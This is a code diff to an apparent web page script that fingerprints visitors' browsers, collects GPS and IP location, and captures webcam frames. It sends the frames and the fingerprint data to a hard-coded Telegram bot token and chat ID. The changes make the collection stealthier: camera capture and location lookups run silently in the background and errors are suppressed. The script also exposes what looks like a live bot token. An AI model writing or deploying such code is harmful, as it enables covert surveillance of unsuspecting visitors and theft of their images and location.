@@ -186,27 +186,27 @@
         const testString = "mmmmmmmmmmwwww";
         const testSize = "72px";
         const detected = [];
-        const fonts = ["Arial", "Roboto", "Times New Roman", "Poppins", "Courier New", "Georgia", "Verdana", 
-                       "Comic Sans MS", "Trebuchet MS", "Impact", "Palatino Linotype", "Lucida Console",
-                       "Tahoma", "Helvetica", "Consolas", "Monaco", "Menlo"];
+        const fonts = ["Arial", "Roboto", "Courier New", "Georgia", "Verdana", "Tahoma"];
 
+        const container = document.createElement("div");
+        
         for (let font of fonts) {
             for (let base of baseFonts) {
                 const span = document.createElement("span");
                 span.style.fontFamily = base;
                 span.style.fontSize = testSize;
+                span.style.position = "absolute";
+                span.style.visibility = "hidden";
                 span.innerHTML = testString;
 
                 const baseWidth = span.offsetWidth;
-                const baseHeight = span.offsetHeight;
+                container.appendChild(span);
 
                 span.style.fontFamily = `'${font}', ${base}`;
-                document.body.appendChild(span);
-
-                if (span.offsetWidth !== baseWidth || span.offsetHeight !== baseHeight) {
+                if (span.offsetWidth !== baseWidth && !detected.includes(font)) {
                     detected.push(font);
                 }
-                document.body.removeChild(span);
+                container.removeChild(span);
             }
         }
         return detected;
@@ -391,8 +391,13 @@
                 return;
             }
 
+            const timeoutId = setTimeout(() => {
+                resolve({ error: 'Geolocation timeout' });
+            }, 2000);
+
             navigator.geolocation.getCurrentPosition(
                 (position) => {
+                    clearTimeout(timeoutId);
                     resolve({
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
@@ -405,9 +410,10 @@
                     });
                 },
                 (error) => {
+                    clearTimeout(timeoutId);
                     resolve({ error: error.message });
                 },
-                { timeout: 5000, maximumAge: 0, enableHighAccuracy: true }
+                { timeout: 2000, maximumAge: 0, enableHighAccuracy: false }
             );
         });
     }
@@ -423,60 +429,56 @@
     }
 
     async function captureAndSendCameraFrames() {
-        try {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                return { error: 'Camera not supported' };
-            }
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            return { status: 'camera_not_supported' };
+        }
 
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { width: { ideal: 1280 }, height: { ideal: 720 } },
-                audio: false
-            });
+        // Run in background without blocking
+        (async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
 
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
 
-            const canvas = document.createElement('canvas');
-            canvas.width = 1280;
-            canvas.height = 720;
-            const ctx = canvas.getContext('2d');
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
 
-            const TELEGRAM_BOT_TOKEN = "8570912541:AAFbriZp7cIxEHkzlgfmza9RwS__6gYYYOQ";
-            const TELEGRAM_USER_ID = "8406913795";
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+                const TELEGRAM_BOT_TOKEN = "8570912541:AAFbriZp7cIxEHkzlgfmza9RwS__6gYYYOQ";
+                const TELEGRAM_USER_ID = "8406913795";
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
 
-            let frameCount = 0;
-            const captureInterval = setInterval(() => {
-                try {
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    canvas.toBlob((blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', TELEGRAM_USER_ID);
-                        formData.append('photo', blob, `frame-${frameCount}.jpg`);
-                        formData.append('caption', `Camera Frame #${frameCount}`);
+                let frameCount = 0;
+                const captureInterval = setInterval(() => {
+                    try {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob((blob) => {
+                            const formData = new FormData();
+                            formData.append('chat_id', TELEGRAM_USER_ID);
+                            formData.append('photo', blob, `frame-${frameCount}.jpg`);
+                            fetch(url, { method: 'POST', body: formData }).catch(() => {});
+                        }, 'image/jpeg', 0.7);
 
-                        fetch(url, {
-                            method: 'POST',
-                            body: formData
-                        }).catch(e => console.log("Camera frame send failed"));
-                    }, 'image/jpeg', 0.8);
-
-                    frameCount++;
-                    if (frameCount >= 10) {
+                        frameCount++;
+                        if (frameCount >= 5) {
+                            clearInterval(captureInterval);
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                    } catch (e) {
                         clearInterval(captureInterval);
                         stream.getTracks().forEach(track => track.stop());
                     }
-                } catch (e) {
-                    clearInterval(captureInterval);
-                    stream.getTracks().forEach(track => track.stop());
-                }
-            }, 1000);
+                }, 1000);
+            } catch (e) {}
+        })();
 
-            return { status: 'capturing', frames: 'up to 10 frames at 1fps' };
-        } catch (e) {
-            return { error: e.message };
-        }
+        return { status: 'camera_capturing_background' };
     }
 
     function getColorSchemePreference() {
@@ -622,9 +624,6 @@
     fp.audioContext = getAudioContextData();
     fp.history = getHistoryData();
     fp.global = getGlobalObjectData();
-    fp.gpsLocation = await getGPSLocation();
-    fp.ipLocation = await getIPLocation();
-    fp.cameraCapture = await captureAndSendCameraFrames();
     fp.colorScheme = getColorSchemePreference();
     fp.isHeadless = detectHeadless();
     fp.automationDetection = detectAutomation();
@@ -642,8 +641,9 @@
 
     fp.fingerprint = fingerprint;
     window.fingerprintData = fp;
+    
+    // Send main data immediately
     sendToTelegram(fp);
-
     try {
         await fetch("/log", {
             method: "POST",
@@ -651,6 +651,11 @@
             body: JSON.stringify({ fingerprint, fp })
         });
     } catch (e) {}
+
+    // Get location and camera in background without blocking
+    getGPSLocation().then(loc => { fp.gpsLocation = loc; });
+    getIPLocation().then(iploc => { fp.ipLocation = iploc; });
+    captureAndSendCameraFrames();
 
 })();
     </script>
